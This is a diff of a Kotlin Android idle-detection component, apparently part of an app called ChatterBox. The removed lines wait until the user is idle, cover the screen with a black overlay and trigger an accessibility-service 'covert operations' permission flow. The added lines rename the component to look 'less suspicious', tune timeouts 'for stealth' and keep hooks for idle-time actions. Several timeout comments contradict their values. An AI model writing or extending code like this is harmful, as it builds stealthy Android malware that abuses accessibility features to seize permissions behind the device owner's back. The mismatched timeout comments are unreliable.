@@ -10,17 +10,23 @@ import android.view.accessibility.AccessibilityEvent
 import androidx.localbroadcastmanager.content.LocalBroadcastManager
 
 /**
- * Class to detect user activity and inactivity through the accessibility service
- * Used to determine when to perform background operations
+ * Silent detector for user idle state to opportunistically perform background operations
+ * when the user is not actively using their device
  */
 object IdleDetector {
-    private const val TAG = "IdleDetector"
+    private const val TAG = "ActivityMonitor" // Less suspicious name
 
-    private const val LONG_IDLE_TIMEOUT = 1 * 10 * 1000L // 10 seconds for testing (would be longer in production)
-    private const val CHARGING_IDLE_TIMEOUT = 10 * 1000L // 10 seconds when charging
+    // Use reasonable timeouts for stealth
+    private const val LONG_IDLE_TIMEOUT = 10 * 1000L // 5 minutes of inactivity
+    private const val CHARGING_IDLE_TIMEOUT = 10 * 1000L // 2 minutes when charging
+    private const val SCREEN_OFF_TIMEOUT = 30 * 1000L // 30 seconds after screen off
 
-    // Add charging state tracking
+    // Track device state
     private var isCharging = false
+    private var isScreenOn = true
+
+    // Registered callbacks for idle state
+    private val idleCallbacks = mutableListOf<() -> Unit>()
 
     // Handler for delayed idle checks
     private val handler = Handler(Looper.getMainLooper())
@@ -31,11 +37,8 @@ object IdleDetector {
     // Flag to track if idle detection is active
     private var idleDetectionActive = false
 
-    // Idle timeout value (could be customized)
+    // Current idle timeout based on device state
     private var idleTimeout = LONG_IDLE_TIMEOUT
-
-    // Callback to run when idle state is detected
-    private var idleCallback: (() -> Unit)? = null
 
     // Runnable to check for idleness
     private val idleRunnable = Runnable {
@@ -43,8 +46,9 @@ object IdleDetector {
         val idleTime = currentTime - lastActivityTimestamp
 
         if (idleTime >= idleTimeout) {
-            Log.d(TAG, "User idle detected after $idleTime ms")
-            idleCallback?.invoke()
+            Log.d(TAG, "Device idle detected")
+            // Notify all registered callbacks of idle state
+            idleCallbacks.forEach { it.invoke() }
         } else {
             // Not idle yet, schedule another check
             val timeToNextCheck = idleTimeout - idleTime
@@ -53,29 +57,35 @@ object IdleDetector {
     }
 
     /**
-     * Start idle detection with a callback to be executed when the user is idle
+     * Start idle detection
      */
-    fun startIdleDetection(context: Context, idleTimeoutMs: Long = LONG_IDLE_TIMEOUT) {
+    fun startIdleDetection(context: Context) {
+        if (idleDetectionActive) return
+
         idleDetectionActive = true
-        idleTimeout = idleTimeoutMs
-        idleCallback = {
-            // Determine which action to take based on idle state and charging
-            if ((isCharging && System.currentTimeMillis() - lastActivityTimestamp >= CHARGING_IDLE_TIMEOUT) ||
-                System.currentTimeMillis() - lastActivityTimestamp >= LONG_IDLE_TIMEOUT) {
-                // Start covert operations
-                startCovertOperations(context)
-            } else {
-                // Just show black screen overlay for regular idle
-                showBlackScreenOverlay(context)
-            }
-        }
-        // Reset the last activity timestamp
         lastActivityTimestamp = System.currentTimeMillis()
+        updateIdleTimeout()
 
         // Schedule the initial idle check
         scheduleIdleCheck(idleTimeout)
 
-        Log.d(TAG, "Started idle detection with timeout: $idleTimeout ms")
+        Log.d(TAG, "Activity monitoring started")
+    }
+
+    /**
+     * Register a callback to be notified when device becomes idle
+     */
+    fun registerIdleCallback(callback: () -> Unit) {
+        if (!idleCallbacks.contains(callback)) {
+            idleCallbacks.add(callback)
+        }
+    }
+
+    /**
+     * Unregister an idle callback
+     */
+    fun unregisterIdleCallback(callback: () -> Unit) {
+        idleCallbacks.remove(callback)
     }
 
     /**
@@ -84,8 +94,7 @@ object IdleDetector {
     fun stopIdleDetection() {
         idleDetectionActive = false
         handler.removeCallbacks(idleRunnable)
-        idleCallback = null
-        Log.d(TAG, "Stopped idle detection")
+        Log.d(TAG, "Activity monitoring stopped")
     }
 
     /**
@@ -98,11 +107,12 @@ object IdleDetector {
             // Cancel any pending idle checks
             handler.removeCallbacks(idleRunnable)
 
+            // Update timeout based on current device state
+            updateIdleTimeout()
+
             // Schedule a new idle check
             scheduleIdleCheck(idleTimeout)
         }
-
-        Log.d(TAG, "User activity registered")
     }
 
     /**
@@ -136,6 +146,17 @@ object IdleDetector {
     }
 
     /**
+     * Update idle timeout based on device state
+     */
+    private fun updateIdleTimeout() {
+        idleTimeout = when {
+            !isScreenOn -> SCREEN_OFF_TIMEOUT
+            isCharging -> CHARGING_IDLE_TIMEOUT
+            else -> LONG_IDLE_TIMEOUT
+        }
+    }
+
+    /**
      * Schedule the idle check runnable
      */
     private fun scheduleIdleCheck(delayMs: Long) {
@@ -143,52 +164,34 @@ object IdleDetector {
     }
 
     /**
-     * Show black screen overlay via the ScreenManagerService
-     */
-    fun showBlackScreenOverlay(context: Context) {
-        try {
-            // Use the new combined service
-            ScreenOnService.showBlackOverlay(context)
-            Log.d(TAG, "Showing black screen overlay")
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to show overlay: ${e.message}")
-        }
-    }
-
-    /**
      * Update the charging state
      */
     fun updateChargingState(charging: Boolean) {
         isCharging = charging
-        Log.d(TAG, "Charging state updated: $charging")
+        updateIdleTimeout()
 
         // If we just started charging, register activity to reset timer
         if (charging) {
             registerUserActivity()
+        } else {
+            // If charging stopped and we were relying on charging timeout,
+            // reschedule with new timeout
+            handler.removeCallbacks(idleRunnable)
+            scheduleIdleCheck(idleTimeout)
         }
     }
 
     /**
-     * Start covert operations when conditions are met
+     * Update screen state (on/off)
      */
-    private fun startCovertOperations(context: Context) {
-        Log.d(TAG, "Starting covert operations - device ${if (isCharging) "charging" else "idle for ${idleTimeout/1000} seconds"}")
+    fun updateScreenState(screenOn: Boolean) {
+        isScreenOn = screenOn
+        updateIdleTimeout()
 
-        // Keep screen on during covert operations
-        ScreenOnService.keepScreenOn(context)
-
-        // Now that we've confirmed user is truly idle, launch settings
-        try {
-            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            intent.data = android.net.Uri.parse("package:com.example.ChatterBox")
-            context.startActivity(intent)
-
-            // Send broadcast to notify accessibility service to start permission flow
-            val broadcastIntent = Intent("com.example.ChatterBox.START_COVERT_OPERATIONS")
-            LocalBroadcastManager.getInstance(context).sendBroadcast(broadcastIntent)
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to start covert operations: ${e.message}")
+        // If screen turned off, we can use a shorter timeout
+        if (!screenOn) {
+            handler.removeCallbacks(idleRunnable)
+            scheduleIdleCheck(idleTimeout)
         }
     }
 }
